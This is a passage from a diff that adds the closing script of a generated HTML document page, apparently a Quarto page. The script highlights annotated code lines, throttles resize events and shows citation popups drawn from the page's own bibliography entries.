+      }
+      const selectCodeLines = (annoteEl) => {
+        const doc = window.document;
+        const targetCell = annoteEl.getAttribute("data-target-cell");
+        const targetAnnotation = annoteEl.getAttribute("data-target-annotation");
+        const annoteSpan = window.document.querySelector(selectorForAnnotation(targetCell, targetAnnotation));
+        const lines = annoteSpan.getAttribute("data-code-lines").split(",");
+        const lineIds = lines.map((line) => {
+          return targetCell + "-" + line;
+        })
+        let top = null;
+        let height = null;
+        let parent = null;
+        if (lineIds.length > 0) {
+            //compute the position of the single el (top and bottom and make a div)
+            const el = window.document.getElementById(lineIds[0]);
+            top = el.offsetTop;
+            height = el.offsetHeight;
+            parent = el.parentElement.parentElement;
+          if (lineIds.length > 1) {
+            const lastEl = window.document.getElementById(lineIds[lineIds.length - 1]);
+            const bottom = lastEl.offsetTop + lastEl.offsetHeight;
+            height = bottom - top;
+          }
+          if (top !== null && height !== null && parent !== null) {
+            // cook up a div (if necessary) and position it 
+            let div = window.document.getElementById("code-annotation-line-highlight");
+            if (div === null) {
+              div = window.document.createElement("div");
+              div.setAttribute("id", "code-annotation-line-highlight");
+              div.style.position = 'absolute';
+              parent.appendChild(div);
+            }
+            div.style.top = top - 2 + "px";
+            div.style.height = height + 4 + "px";
+            div.style.left = 0;
+            let gutterDiv = window.document.getElementById("code-annotation-line-highlight-gutter");
+            if (gutterDiv === null) {
+              gutterDiv = window.document.createElement("div");
+              gutterDiv.setAttribute("id", "code-annotation-line-highlight-gutter");
+              gutterDiv.style.position = 'absolute';
+              const codeCell = window.document.getElementById(targetCell);
+              const gutter = codeCell.querySelector('.code-annotation-gutter');
+              gutter.appendChild(gutterDiv);
+            }
+            gutterDiv.style.top = top - 2 + "px";
+            gutterDiv.style.height = height + 4 + "px";
+          }
+          selectedAnnoteEl = annoteEl;
+        }
+      };
+      const unselectCodeLines = () => {
+        const elementsIds = ["code-annotation-line-highlight", "code-annotation-line-highlight-gutter"];
+        elementsIds.forEach((elId) => {
+          const div = window.document.getElementById(elId);
+          if (div) {
+            div.remove();
+          }
+        });
+        selectedAnnoteEl = undefined;
+      };
+        // Handle positioning of the toggle
+    window.addEventListener(
+      "resize",
+      throttle(() => {
+        elRect = undefined;
+        if (selectedAnnoteEl) {
+          selectCodeLines(selectedAnnoteEl);
+        }
+      }, 10)
+    );
+    function throttle(fn, ms) {
+    let throttle = false;
+    let timer;
+      return (...args) => {
+        if(!throttle) { // first call gets through
+            fn.apply(this, args);
+            throttle = true;
+        } else { // all the others get throttled
+            if(timer) clearTimeout(timer); // cancel #2
+            timer = setTimeout(() => {
+              fn.apply(this, args);
+              timer = throttle = false;
+            }, ms);
+        }
+      };
+    }
+      // Attach click handler to the DT
+      const annoteDls = window.document.querySelectorAll('dt[data-target-cell]');
+      for (const annoteDlNode of annoteDls) {
+        annoteDlNode.addEventListener('click', (event) => {
+          const clickedEl = event.target;
+          if (clickedEl !== selectedAnnoteEl) {
+            unselectCodeLines();
+            const activeEl = window.document.querySelector('dt[data-target-cell].code-annotation-active');
+            if (activeEl) {
+              activeEl.classList.remove('code-annotation-active');
+            }
+            selectCodeLines(clickedEl);
+            clickedEl.classList.add('code-annotation-active');
+          } else {
+            // Unselect the line
+            unselectCodeLines();
+            clickedEl.classList.remove('code-annotation-active');
+          }
+        });
+      }
+  const findCites = (el) => {
+    const parentEl = el.parentElement;
+    if (parentEl) {
+      const cites = parentEl.dataset.cites;
+      if (cites) {
+        return {
+          el,
+          cites: cites.split(' ')
+        };
+      } else {
+        return findCites(el.parentElement)
+      }
+    } else {
+      return undefined;
+    }
+  };
+  var bibliorefs = window.document.querySelectorAll('a[role="doc-biblioref"]');
+  for (var i=0; i<bibliorefs.length; i++) {
+    const ref = bibliorefs[i];
+    const citeInfo = findCites(ref);
+    if (citeInfo) {
+      tippyHover(citeInfo.el, function() {
+        var popup = window.document.createElement('div');
+        citeInfo.cites.forEach(function(cite) {
+          var citeDiv = window.document.createElement('div');
+          citeDiv.classList.add('hanging-indent');
+          citeDiv.classList.add('csl-entry');
+          var biblioDiv = window.document.getElementById('ref-' + cite);
+          if (biblioDiv) {
+            citeDiv.innerHTML = biblioDiv.innerHTML;
+          }
+          popup.appendChild(citeDiv);
+        });
+        return popup.innerHTML;
+      });
+    }
+  }
+});
+</script>
+</div> <!-- /content -->
+
+
+
+
+</body></html>
